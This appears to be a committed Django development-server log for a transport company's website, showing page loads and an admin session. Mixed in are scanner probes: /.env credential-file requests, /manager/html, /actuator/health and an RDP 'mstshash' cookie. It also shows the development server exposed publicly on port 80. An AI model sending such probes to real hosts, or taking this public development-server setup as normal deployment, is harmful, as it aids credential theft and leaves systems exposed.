+[27/Jul/2023 00:05:22] "GET / HTTP/1.1" 200 11503
+[27/Jul/2023 01:03:51] "GET /manager/html HTTP/1.1" 404 179
+[27/Jul/2023 01:17:02] "GET / HTTP/1.1" 200 11503
+[27/Jul/2023 01:42:23] "POST / HTTP/1.1" 403 1444
+[27/Jul/2023 01:42:23] "GET /.env HTTP/1.1" 404 179
+[27/Jul/2023 01:56:02] code 400, message Bad request version ('\x91äP!\x9e½ä[Õ\x8b\x8f')
+[27/Jul/2023 01:56:02] You're accessing the development server over HTTPS, but it only supports HTTP.
+[27/Jul/2023 01:58:43] "GET /actuator/health HTTP/1.1" 404 179
+[27/Jul/2023 02:05:57] "GET / HTTP/1.1" 200 11503
+[27/Jul/2023 02:20:33] "POST / HTTP/1.1" 403 1444
+[27/Jul/2023 02:20:33] "GET /.env HTTP/1.1" 404 179
+[27/Jul/2023 02:22:42] code 400, message Bad request syntax ('\x00\x0e8b}\x8dP¹¸ß\x9f\x00\x00\x00\x00\x00')
+[27/Jul/2023 02:22:42] " 8b}P¹¸ß     " 400 -
+[27/Jul/2023 02:31:08] "GET / HTTP/1.1" 200 11503
+[27/Jul/2023 02:41:03] "GET /.env HTTP/1.1" 404 179
+[27/Jul/2023 02:41:03] code 400, message Bad HTTP/0.9 request type ('\x16\x03\x01\x01H\x01\x00\x01D\x03\x03µ\x1b5íäã¢_\x83\x15¾ý\x8b\x03úº\x1a\x8f¨÷¢\x7fE[="Ré(o\x1ax')
+[27/Jul/2023 02:41:03] You're accessing the development server over HTTPS, but it only supports HTTP.
+[27/Jul/2023 02:54:37] code 400, message Bad request version ('À(À$À\x14À')
+[27/Jul/2023 02:54:37] You're accessing the development server over HTTPS, but it only supports HTTP.
+[27/Jul/2023 03:08:27] "GET / HTTP/1.1" 200 11503
+[27/Jul/2023 03:08:27] "GET /static/css/main.css HTTP/1.1" 304 0
+[27/Jul/2023 03:08:27] "GET /static/img/image-tda.png HTTP/1.1" 304 0
+[27/Jul/2023 03:08:28] "GET /static/img/camion-1.jpeg HTTP/1.1" 304 0
+[27/Jul/2023 03:08:28] "GET /static/img/camion-2.jpg HTTP/1.1" 304 0
+[27/Jul/2023 03:08:28] "GET /static/img/background.jpg HTTP/1.1" 304 0
+[27/Jul/2023 03:08:28] "GET /static/img/banner.jpg HTTP/1.1" 304 0
+[27/Jul/2023 03:08:43] "GET / HTTP/1.1" 200 11503
+[27/Jul/2023 03:09:06] "GET /admin/ HTTP/1.1" 302 0
+[27/Jul/2023 03:09:07] "GET /admin/login/?next=/admin/ HTTP/1.1" 200 3154
+[27/Jul/2023 03:09:07] "GET /static/vendor/fontawesome-free/css/all.min.css HTTP/1.1" 304 0
+[27/Jul/2023 03:09:07] "GET /static/jazzmin/css/main.css HTTP/1.1" 304 0
+[27/Jul/2023 03:09:07] "GET /static/vendor/adminlte/css/adminlte.min.css HTTP/1.1" 304 0
+[27/Jul/2023 03:09:07] "GET /static/vendor/bootswatch/simplex/bootstrap.min.css HTTP/1.1" 304 0
+[27/Jul/2023 03:09:07] "GET /static/admin/js/vendor/jquery/jquery.js HTTP/1.1" 304 0
+[27/Jul/2023 03:09:07] "GET /static/vendor/bootstrap/js/bootstrap.min.js HTTP/1.1" 304 0
+[27/Jul/2023 03:09:07] "GET /static/vendor/adminlte/js/adminlte.min.js HTTP/1.1" 304 0
+[27/Jul/2023 03:09:07] "GET /static/vendor/fontawesome-free/webfonts/fa-solid-900.woff2 HTTP/1.1" 304 0
+[27/Jul/2023 03:09:11] "POST /admin/login/?next=/admin/ HTTP/1.1" 302 0
+[27/Jul/2023 03:09:12] "GET /admin/ HTTP/1.1" 200 25811
+[27/Jul/2023 03:09:12] "GET /static/vendor/fontawesome-free/webfonts/fa-regular-400.woff2 HTTP/1.1" 304 0
+[27/Jul/2023 03:09:12] "GET /static/jazzmin/js/main.js HTTP/1.1" 304 0
+[27/Jul/2023 03:09:15] "GET /admin/auth/user/ HTTP/1.1" 200 21901
+[27/Jul/2023 03:09:15] "GET /static/admin/js/core.js HTTP/1.1" 304 0
+[27/Jul/2023 03:09:15] "GET /static/admin/js/jquery.init.js HTTP/1.1" 304 0
+[27/Jul/2023 03:09:15] "GET /static/vendor/select2/css/select2.min.css HTTP/1.1" 304 0
+[27/Jul/2023 03:09:15] "GET /static/admin/js/vendor/jquery/jquery.min.js HTTP/1.1" 304 0
+[27/Jul/2023 03:09:15] "GET /admin/jsi18n/ HTTP/1.1" 200 8006
+[27/Jul/2023 03:09:16] "GET /static/admin/js/admin/RelatedObjectLookups.js HTTP/1.1" 304 0
+[27/Jul/2023 03:09:16] "GET /static/admin/js/actions.js HTTP/1.1" 304 0
+[27/Jul/2023 03:09:16] "GET /static/admin/js/urlify.js HTTP/1.1" 304 0
+[27/Jul/2023 03:09:16] "GET /static/admin/js/prepopulate.js HTTP/1.1" 304 0
+[27/Jul/2023 03:09:16] "GET /static/admin/js/vendor/xregexp/xregexp.min.js HTTP/1.1" 304 0
+[27/Jul/2023 03:09:16] "GET /static/vendor/select2/js/select2.min.js HTTP/1.1" 304 0
+[27/Jul/2023 03:09:16] "GET /static/jazzmin/js/change_list.js HTTP/1.1" 304 0
+[27/Jul/2023 03:09:16] "GET /static/admin/img/icon-yes.svg HTTP/1.1" 200 436
+[27/Jul/2023 03:09:16] "GET /static/admin/img/icon-no.svg HTTP/1.1" 200 560
+[27/Jul/2023 03:09:26] "POST /admin/auth/user/ HTTP/1.1" 200 13739
+[27/Jul/2023 03:09:26] "GET /static/admin/js/cancel.js HTTP/1.1" 200 564
+[27/Jul/2023 03:09:30] "POST /admin/auth/user/ HTTP/1.1" 302 0
+[27/Jul/2023 03:09:30] "GET /admin/auth/user/ HTTP/1.1" 200 21919
+[27/Jul/2023 03:09:30] "GET /static/img/image-tda.png HTTP/1.1" 304 0
+[27/Jul/2023 03:09:30] "GET /admin/jsi18n/ HTTP/1.1" 200 8006
+[27/Jul/2023 03:09:34] "GET /admin/Transporteapp/bitacora/ HTTP/1.1" 200 17188
+[27/Jul/2023 03:09:35] "GET /admin/jsi18n/ HTTP/1.1" 200 8006
+[27/Jul/2023 03:09:36] "GET /admin/Transporteapp/cotizaci%C3%B3n/ HTTP/1.1" 200 25349
+[27/Jul/2023 03:09:36] "GET /admin/jsi18n/ HTTP/1.1" 200 8006
+[27/Jul/2023 03:09:37] "GET /admin/Transporteapp/ordendeservicio/ HTTP/1.1" 200 19474
+[27/Jul/2023 03:09:37] "GET /admin/jsi18n/ HTTP/1.1" 200 8006
+[27/Jul/2023 03:09:39] "GET /admin/Transporteapp/cotizaci%C3%B3n/ HTTP/1.1" 200 25349
+[27/Jul/2023 03:09:39] "GET /admin/jsi18n/ HTTP/1.1" 200 8006
+[27/Jul/2023 03:09:46] "POST /admin/Transporteapp/cotizaci%C3%B3n/ HTTP/1.1" 200 14100
+[27/Jul/2023 03:09:48] "POST /admin/Transporteapp/cotizaci%C3%B3n/ HTTP/1.1" 302 0
+[27/Jul/2023 03:09:48] "GET /admin/Transporteapp/cotizaci%C3%B3n/ HTTP/1.1" 200 23788
+[27/Jul/2023 03:09:48] "GET /admin/jsi18n/ HTTP/1.1" 200 8006
+[27/Jul/2023 03:09:53] "GET /admin/ HTTP/1.1" 200 25770
+[27/Jul/2023 03:09:56] "GET /admin/Transporteapp/ordendeservicio/ HTTP/1.1" 200 19474
+[27/Jul/2023 03:09:56] "GET /admin/jsi18n/ HTTP/1.1" 200 8006
+[27/Jul/2023 03:09:59] "GET /admin/Transporteapp/ordendeservicio/add/ HTTP/1.1" 200 24015
+[27/Jul/2023 03:09:59] "GET /static/admin/js/calendar.js HTTP/1.1" 200 8466
+[27/Jul/2023 03:09:59] "GET /static/admin/js/admin/DateTimeShortcuts.js HTTP/1.1" 200 19319
+[27/Jul/2023 03:09:59] "GET /admin/jsi18n/ HTTP/1.1" 200 8006
+[27/Jul/2023 03:09:59] "GET /static/admin/js/change_form.js HTTP/1.1" 304 0
+[27/Jul/2023 03:09:59] "GET /static/admin/js/prepopulate_init.js HTTP/1.1" 304 0
+[27/Jul/2023 03:09:59] "GET /static/admin/img/icon-changelink.svg HTTP/1.1" 304 0
+[27/Jul/2023 03:09:59] "GET /static/admin/img/icon-addlink.svg HTTP/1.1" 304 0
+[27/Jul/2023 03:09:59] "GET /static/admin/img/icon-viewlink.svg HTTP/1.1" 304 0
+[27/Jul/2023 03:09:59] "GET /static/jazzmin/js/change_form.js HTTP/1.1" 304 0
+[27/Jul/2023 03:10:07] "GET /admin/ HTTP/1.1" 200 25770
+[27/Jul/2023 03:10:07] "GET /static/vendor/adminlte/css/adminlte.min.css HTTP/1.1" 304 0
+[27/Jul/2023 03:10:07] "GET /static/vendor/fontawesome-free/css/all.min.css HTTP/1.1" 304 0
+[27/Jul/2023 03:10:07] "GET /static/jazzmin/css/main.css HTTP/1.1" 304 0
+[27/Jul/2023 03:10:07] "GET /static/vendor/bootswatch/simplex/bootstrap.min.css HTTP/1.1" 304 0
+[27/Jul/2023 03:10:08] "GET /static/admin/js/vendor/jquery/jquery.js HTTP/1.1" 304 0
+[27/Jul/2023 03:10:08] "GET /static/vendor/bootstrap/js/bootstrap.min.js HTTP/1.1" 304 0
+[27/Jul/2023 03:10:08] "GET /static/vendor/adminlte/js/adminlte.min.js HTTP/1.1" 304 0
+[27/Jul/2023 03:10:11] "GET /admin/logout/ HTTP/1.1" 200 2194
+[27/Jul/2023 03:13:55] "POST / HTTP/1.1" 403 1444
+[27/Jul/2023 03:13:55] "GET /.env HTTP/1.1" 404 179
+[27/Jul/2023 03:15:35] "GET / HTTP/1.1" 200 11503
+[27/Jul/2023 03:28:21] "GET / HTTP/1.1" 200 11503
+[27/Jul/2023 03:28:21] "GET /static/css/main.css HTTP/1.1" 304 0
+[27/Jul/2023 03:28:21] "GET /static/img/image-tda.png HTTP/1.1" 304 0
+[27/Jul/2023 03:28:21] "GET /static/img/camion-1.jpeg HTTP/1.1" 304 0
+[27/Jul/2023 03:28:21] "GET /static/img/camion-2.jpg HTTP/1.1" 304 0
+[27/Jul/2023 03:28:21] "GET /static/img/background.jpg HTTP/1.1" 304 0
+[27/Jul/2023 03:28:21] "GET /static/img/banner.jpg HTTP/1.1" 304 0
+[27/Jul/2023 03:39:01,525] - Broken pipe from ('167.94.138.33', 48668)
+[27/Jul/2023 03:39:02] "GET / HTTP/1.1" 200 11503
+[27/Jul/2023 03:39:02,573] - Broken pipe from ('167.94.138.33', 42534)
+[27/Jul/2023 03:39:02] "GET / HTTP/1.1" 200 11503
+[27/Jul/2023 03:39:02] code 505, message Invalid HTTP version (2.0)
+[27/Jul/2023 03:39:02] "PRI * HTTP/2.0" 505 -
+[27/Jul/2023 03:39:02] "GET /static/img/image-tda.png HTTP/1.1" 200 69859
+[27/Jul/2023 03:39:02] "GET /favicon.ico HTTP/1.1" 404 179
+[27/Jul/2023 03:41:38] "GET / HTTP/1.1" 200 11503
+[27/Jul/2023 03:56:06] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
+[27/Jul/2023 03:56:06] "  /*à     Cookie: mstshash=Administr" 400 -
+[27/Jul/2023 04:08:58] "GET / HTTP/1.1" 200 11503
+[27/Jul/2023 04:12:09] code 400, message Bad request version ('À\x14À')
+[27/Jul/2023 04:12:09] You're accessing the development server over HTTPS, but it only supports HTTP.
+Performing system checks...
+
+System check identified no issues (0 silenced).
+July 27, 2023 - 04:18:16
+Django version 4.2.1, using settings 'proyecto.settings'
+Starting development server at http://147.182.184.6:80/
+Quit the server with CONTROL-C.
+
+[27/Jul/2023 04:18:49] "HEAD / HTTP/1.1" 200 0
+[27/Jul/2023 04:18:51] "GET /.env HTTP/1.1" 404 179
+[27/Jul/2023 04:18:52] "POST / HTTP/1.1" 403 1444
+[27/Jul/2023 04:19:46] "GET / HTTP/1.1" 200 11874
+[27/Jul/2023 04:19:47] "GET /static/css/main.css HTTP/1.1" 304 0
+[27/Jul/2023 04:19:47] "GET /static/img/image-tda.png HTTP/1.1" 304 0
+[27/Jul/2023 04:19:47] "GET /static/img/camion-1.jpeg HTTP/1.1" 304 0
+[27/Jul/2023 04:19:47] "GET /static/img/camion-2.jpg HTTP/1.1" 304 0
+[27/Jul/2023 04:19:47] "GET /static/img/background.jpg HTTP/1.1" 304 0
+[27/Jul/2023 04:19:47] "GET /static/img/banner.jpg HTTP/1.1" 304 0
+[27/Jul/2023 04:20:12] "GET / HTTP/1.1" 200 11874
+[27/Jul/2023 04:22:44] code 400, message Bad request syntax ('MGLNDD_147.182.184.6_80')
+[27/Jul/2023 04:22:44] "MGLNDD_147.182.184.6_80" 400 -
+[27/Jul/2023 04:23:29] "GET / HTTP/1.1" 200 11874
+[27/Jul/2023 04:23:29] "GET /static/css/main.css HTTP/1.1" 304 0
+[27/Jul/2023 04:23:29] "GET /static/img/image-tda.png HTTP/1.1" 304 0
+[27/Jul/2023 04:23:30] "GET /static/img/camion-1.jpeg HTTP/1.1" 304 0
+[27/Jul/2023 04:23:30] "GET /static/img/background.jpg HTTP/1.1" 304 0
+[27/Jul/2023 04:23:30] "GET /static/img/camion-2.jpg HTTP/1.1" 304 0
+[27/Jul/2023 04:23:30] "GET /static/img/banner.jpg HTTP/1.1" 304 0
